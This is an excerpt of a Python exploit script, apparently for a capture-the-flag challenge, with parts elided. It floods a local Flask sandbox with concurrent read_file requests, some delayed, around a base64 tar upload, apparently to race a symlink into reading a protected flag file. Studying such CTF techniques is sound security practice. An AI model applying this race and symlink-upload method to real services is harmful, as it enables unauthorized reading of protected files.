...
print("http://127.0.0.1:5000/upload?tar="+flag_tar64)
...
async def async_requests_example():
    ...
    urls = []
    for i in range(100):
        urls.append('http://127.0.0.1:5000/sandbox?method=read_file&args=link')
    [urls.append(i) for i in [
        # "http://127.0.0.1:5000/sandbox?method=write_file&args=flag_link&args=skibidi",
        # "http://127.0.0.1:5000/list_users",
        'http://127.0.0.1:5000/sandbox?method=read_file&args=link',
        'http://127.0.0.1:5000/sandbox?method=read_file&args=link',
        'http://127.0.0.1:5000/sandbox?method=read_file&args=link',
        'http://127.0.0.1:5000/sandbox?method=read_file&args=link',
        'http://127.0.0.1:5000/sandbox?method=read_file&args=link',
        ...
        'http://127.0.0.1:5000/sandbox?method=read_file&args=link',
        'http://127.0.0.1:5000/sandbox?method=read_file&args=link',
        "http://127.0.0.1:5000/sandbox?method=read_file&args=link&delay=1",
        "http://127.0.0.1:5000/sandbox?method=read_file&args=link&delay=2",
        "http://127.0.0.1:5000/sandbox?method=read_file&args=link&delay=3",
        "http://127.0.0.1:5000/sandbox?method=read_file&args=link&delay=4",
        "http://127.0.0.1:5000/sandbox?method=read_file&args=link&delay=5",
        "http://127.0.0.1:5000/sandbox?method=read_file&args=link&delay=6",
        "http://127.0.0.1:5000/sandbox?method=read_file&args=link&delay=7",

        "http://127.0.0.1:5000/upload?tar="+ flag_tar64,
        'http://127.0.0.1:5000/sandbox?method=read_file&args=link',
        'http://127.0.0.1:5000/sandbox?method=read_file&args=link',
        'http://127.0.0.1:5000/sandbox?method=read_file&args=link',
        'http://127.0.0.1:5000/sandbox?method=read_file&args=link',
        ...
        "http://127.0.0.1:5000/sandbox?method=read_file&args=link&delay=5",
        "http://127.0.0.1:5000/sandbox?method=read_file&args=link&delay=6",
        # "http://127.0.0.1:5000/upload?tar="+ tar64,
    ]]
...
def upload_users_link():
    ...
    # url = 'http://127.0.0.1:5000/upload?tar=' + tar64
